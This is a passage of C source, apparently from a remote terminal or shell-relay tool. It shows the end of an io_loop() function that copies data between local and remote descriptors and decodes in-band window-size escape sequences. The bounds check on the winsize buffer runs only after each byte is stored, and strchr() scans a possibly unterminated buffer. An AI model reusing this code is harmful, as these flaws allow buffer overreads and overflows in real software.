								program_invocation_short_name, listener, remote_fd, \
								(unsigned long) winsize_buff_head, io_bytes, retval, io_bytes);
#endif
						retval = -1;
						goto CLEAN_UP;
					}
					break;

				default:

#ifdef DEBUG
					fprintf(stderr, "%s: %d: io_loop(): Undefined signal found: %d\r\n", \
							program_invocation_short_name, listener, current_sig);
#endif
					retval = -1;
					goto CLEAN_UP;
			}

			current_sig = 0;


			// Case 2: Data is ready on the local fd.
		}else if(FD_ISSET(local_fd, &fd_select)){

			memset(buff_head, 0, buff_len);

			if((io_bytes = read(local_fd, buff_head, buff_len)) == -1){
#ifdef DEBUG
				fprintf(stderr, "%s: %d: io_loop(): read(%d, %lx, %d): %s\r\n", \
						program_invocation_short_name, listener, \
						local_fd, (unsigned long) buff_head, buff_len, strerror(errno));
#endif
				retval = -1;
				goto CLEAN_UP;
			}

			if(!io_bytes){
#ifdef DEBUG
				fprintf(stderr, "%s: %d: io_loop(): read(%d, %lx, %d): A OK!\r\n", \
						program_invocation_short_name, listener, \
						local_fd, (unsigned long) buff_head, buff_len);
#endif
				retval = 0;
				goto CLEAN_UP;
			}

			if((retval = write(remote_fd, buff_head, io_bytes)) == -1){
#ifdef DEBUG
				fprintf(stderr, "%s: %d: io_loop(): write(%d, %lx, %d): %s\r\n", \
						program_invocation_short_name, listener, \
						remote_fd, (unsigned long) buff_head, io_bytes, strerror(errno));
#endif
				goto CLEAN_UP;
			}

			if(retval != io_bytes){
#ifdef DEBUG
				fprintf(stderr, \
						"%s: %d: io_loop(): write(%d, %lx, %d): %d bytes of %d written\r\n", \
						program_invocation_short_name, listener, \
						remote_fd, (unsigned long) buff_head, io_bytes, retval, io_bytes);
#endif
				retval = -1;
				goto CLEAN_UP;
			}

			// Case 3: Data is ready on the remote fd.
		}else if(FD_ISSET(remote_fd, &fd_select)){

			memset(buff_head, 0, buff_len);

			if((io_bytes = read(remote_fd, buff_head, buff_len)) == -1){
#ifdef DEBUG
				fprintf(stderr, "%s: %d: io_loop(): read(%d, %lx, %d): %s\r\n", \
						program_invocation_short_name, listener, \
						remote_fd, (unsigned long) buff_head, buff_len, strerror(errno));
#endif
				retval = -1;
				goto CLEAN_UP;
			}

			if(!io_bytes){
#ifdef DEBUG
				fprintf(stderr, "%s: %d: io_loop(): read(%d, %lx, %d): A OK!\r\n", \
						program_invocation_short_name, listener, \
						remote_fd, (unsigned long) buff_head, buff_len);
#endif
				retval = 0;
				goto CLEAN_UP;
			}

			buff_tail = buff_head + io_bytes;


			if(!listener && (event_ptr = strchr(buff_head, (char) UTF8_HIGH))){

				// First, clear out any data not part of the in-band signalling
				// that may be at the front of our buffer.
				tmp_len = event_ptr - buff_head;
				if((retval = write(local_fd, buff_head, tmp_len)) == -1){
#ifdef DEBUG
					fprintf(stderr, "%s: %d: io_loop(): write(%d, %lx, %d): %s\r\n", \
							program_invocation_short_name, listener, \
							local_fd, (unsigned long) buff_head, tmp_len, strerror(errno));
#endif
					goto CLEAN_UP;
				}

				if(retval != tmp_len){
#ifdef DEBUG
					fprintf(stderr, \
							"%s: %d: io_loop(): write(%d, %lx, %d): %d bytes of %d written\r\n", \
							program_invocation_short_name, listener, \
							local_fd, (unsigned long) buff_head, tmp_len, retval, io_bytes);
#endif
					retval = -1;
					goto CLEAN_UP;
				}

				// At this point, either buff_head is pointing to unused space or it matches event_ptr and is already UTF8_HIGH.
				// Either way, lets put UTF8_HIGH in at buff_head[0] so we can reference it later.
				*buff_head = (char) UTF8_HIGH;

				// setup a state counter. Then retrieve next char from the appropriate place.
				state_counter = APC_HIGH_FOUND;

				// Get winsize data structures ready
				memset(winsize_buff_head, 0, winsize_buff_len);
				winsize_buff_tail = winsize_buff_head;

				while(state_counter || (event_ptr != buff_tail)){

					if(event_ptr != buff_tail){
						event_ptr++;
						tmp_char = *event_ptr;

					}else{

						// read() a char
						if((tmp_len = read(remote_fd, &tmp_char, 1)) == -1){
#ifdef DEBUG
							fprintf(stderr, "%s: %d: read(%d, %lx, %d): %s\r\n", \
									program_invocation_short_name, listener, \
									remote_fd, (unsigned long) &tmp_char, 1, strerror(errno));
#endif
							retval = -1;
							goto CLEAN_UP;
						}
					}

					// now we have a char, go into the state handler
					switch(state_counter){

						// Here, we found the opening APC_HIGH, but it wasn't related to an event. Further, the buffer isn't empty.
						// Consume the data, one char at a time, and make sure we don't find another event start.			
						case NO_EVENT:

							if(tmp_char == (char) UTF8_HIGH){
								state_counter = APC_HIGH_FOUND;
							}else{

								if((retval = write(local_fd, &tmp_char, 1)) == -1){
#ifdef DEBUG
									fprintf(stderr, "%s: %d: io_loop(): write(%d, %lx, %d): %s\r\n", \
											program_invocation_short_name, listener, \
											local_fd, (unsigned long) &tmp_char, 1, strerror(errno));
#endif
									goto CLEAN_UP;
								}

								if(retval != 1){
#ifdef DEBUG
									fprintf(stderr, \
											"%s: %d: io_loop(): write(%d, %lx, %d): %d bytes of %d written\r\n", \
											program_invocation_short_name, listener, \
											local_fd, (unsigned long) &tmp_char, 1, retval, 1);
#endif
									retval = -1;
									goto CLEAN_UP;
								}
							}

							break;

							// check that we are actually in an event.
						case APC_HIGH_FOUND:

							if(tmp_char == (char) APC){
								state_counter = DATA_FOUND;

							}else{
								// damn you unicode!!!
								state_counter = NO_EVENT;

								// remember that UTF8_HIGH we stored at buff_head[0] earlier?  Yeah. :)
								if((retval = write(local_fd, buff_head, 1)) == -1){
#ifdef DEBUG
									fprintf(stderr, "%s: %d: io_loop(): write(%d, %lx, %d): %s\r\n", \
											program_invocation_short_name, listener, \
											local_fd, (unsigned long) UTF8_HIGH, 1, strerror(errno));
#endif
									goto CLEAN_UP;
								}

								if(retval != 1){
#ifdef DEBUG
									fprintf(stderr, \
											"%s: %d: io_loop(): write(%d, %lx, %d): %d bytes of %d written\r\n", \
											program_invocation_short_name, listener, \
											local_fd, (unsigned long) UTF8_HIGH, 1, retval, 1);
#endif
									retval = -1;
									goto CLEAN_UP;
								}

								if((retval = write(local_fd, &tmp_char, 1)) == -1){
#ifdef DEBUG
									fprintf(stderr, "%s: %d: io_loop(): write(%d, %lx, %d): %s\r\n", \
											program_invocation_short_name, listener, \
											local_fd, (unsigned long) &tmp_char, 1, strerror(errno));
#endif
									goto CLEAN_UP;
								}

								if(retval != 1){
#ifdef DEBUG
									fprintf(stderr, \
											"%s: %d: io_loop(): write(%d, %lx, %d): %d bytes of %d written\r\n", \
											program_invocation_short_name, listener, \
											local_fd, (unsigned long) &tmp_char, 1, retval, 1);
#endif
									retval = -1;
									goto CLEAN_UP;
								}
							}

							break;

						case DATA_FOUND:

							if(tmp_char == (char) UTF8_HIGH){
								state_counter = ST_HIGH_FOUND;
							}else{
								*(winsize_buff_tail++) = tmp_char;

								if((winsize_buff_tail - winsize_buff_head) > winsize_buff_len){

									fprintf(stderr, \
											"%s: %d: io_loop(): switch(%d): winsize_buff overflow.\r\n", \
											program_invocation_short_name, listener, state_counter);
									retval = -1;
									goto CLEAN_UP;
								}
							}
							break;

						case ST_HIGH_FOUND:

							if(tmp_char == (char) ST){

								state_counter = NO_EVENT;

								// Should have the winsize data by this point, so consume it and 
								// signal the foreground process group.
								if((winsize_vec = string_to_vector(winsize_buff_head)) == NULL){
#ifdef DEBUG
									fprintf(stderr, "%s: %d: io_loop(): string_to_vector(%s): %s\r\n", \
											program_invocation_short_name, listener, \
											winsize_buff_head, strerror(errno));
#endif
									retval = -1;
									goto CLEAN_UP;
								}

								if(winsize_vec[0] == NULL){
#ifdef DEBUG
									fprintf(stderr, \
											"%s: %d: invalid initialization: tty_winsize.ws_row\r\n", \
											program_invocation_short_name, listener);
#endif
									retval = -1;
									goto CLEAN_UP;
								}

								errno = 0;
								tty_winsize.ws_row = (short) strtol(winsize_vec[0], NULL, 10);
								if(errno){
#ifdef DEBUG
									fprintf(stderr, "%s: %d: strtol(%s): %s\r\n", \
											program_invocation_short_name, listener, \
											winsize_vec[0], strerror(errno));
#endif
									retval = -1;
									goto CLEAN_UP;
								}

								if(winsize_vec[1] == NULL){
#ifdef DEBUG
									fprintf(stderr, \
											"%s: %d: invalid initialization: tty_winsize.ws_col\r\n", \
											program_invocation_short_name, listener);
#endif
									retval = -1;
									goto CLEAN_UP;
								}

								errno = 0;
								tty_winsize.ws_col = (short) strtol(winsize_vec[1], NULL, 10);
								if(errno){
#ifdef DEBUG
									fprintf(stderr, "%s: %d: strtol(%s): %s\r\n", \
											program_invocation_short_name, listener, \
											winsize_vec[1], strerror(errno));
#endif
									retval = -1;
									goto CLEAN_UP;
								}

								if((retval = ioctl(local_fd, TIOCSWINSZ, &tty_winsize)) == -1){
#ifdef DEBUG
									fprintf(stderr, "%s: %d: ioctl(%d, %d, %lx): %s\r\n", \
											program_invocation_short_name, listener, \
											local_fd, TIOCGWINSZ, (unsigned long) &tty_winsize, \
											strerror(errno));
#endif
									goto CLEAN_UP;
								}

								if((sig_pid = tcgetsid(local_fd)) == -1){
#ifdef DEBUG
									fprintf(stderr, "%s: %d: tcgetsid(%d): %s\r\n", \
											program_invocation_short_name, listener, \
											local_fd, strerror(errno));
#endif
									retval = -1;
									goto CLEAN_UP;
								}

								if((retval = kill(-sig_pid, SIGWINCH)) == -1){
#ifdef DEBUG
									fprintf(stderr, "%s: %d: kill(%d, %d): %s\r\n", \
											program_invocation_short_name, listener, \
											-sig_pid, SIGWINCH, strerror(errno));
#endif
									goto CLEAN_UP;
								}

							}else{
								// The winsize data is encoded as ascii. It should never come across at UTF8_HIGH.
								// So this case will always be an error. Handle as such.
								fprintf(stderr, \
										"%s: %d: io_loop(): switch(%d): high closing byte found w/out low closing byte. Should not be here!\r\n", \
										program_invocation_short_name, listener, state_counter);
								retval = -1;
								goto CLEAN_UP;
							}

							break;

						default:

							// Handle error case.
							fprintf(stderr, \
									"%s: %d: io_loop(): switch(%d): unknown state. Should not be here!\r\n", \
									program_invocation_short_name, listener, state_counter);
							retval = -1;
							goto CLEAN_UP;

					}

				}

			}else{

				// Don't forget to write output for the normal case!
				if((retval = write(local_fd, buff_head, io_bytes)) == -1){
#ifdef DEBUG
					fprintf(stderr, "%s: %d: io_loop(): write(%d, %lx, %d): %s\r\n", \
							program_invocation_short_name, listener, \
							local_fd, (unsigned long) buff_head, io_bytes, strerror(errno));
#endif
					goto CLEAN_UP;
				}

				if(retval != io_bytes){
#ifdef DEBUG
					fprintf(stderr, \
							"%s: %d: io_loop(): write(%d, %lx, %d): %d bytes of %d written\r\n", \
							program_invocation_short_name, listener, \
							local_fd, (unsigned long) buff_head, io_bytes, retval, io_bytes);
#endif
					retval = -1;
					goto CLEAN_UP;
				}

			}
		}
	}
#ifdef DEBUG
	fprintf(stderr, "%s: %d: io_loop(): while(1): Shouldn't ever be here.\r\n", \
			program_invocation_short_name, listener);
	retval = -1;
#endif

CLEAN_UP:
	free(buff_head);
	return(retval);
}
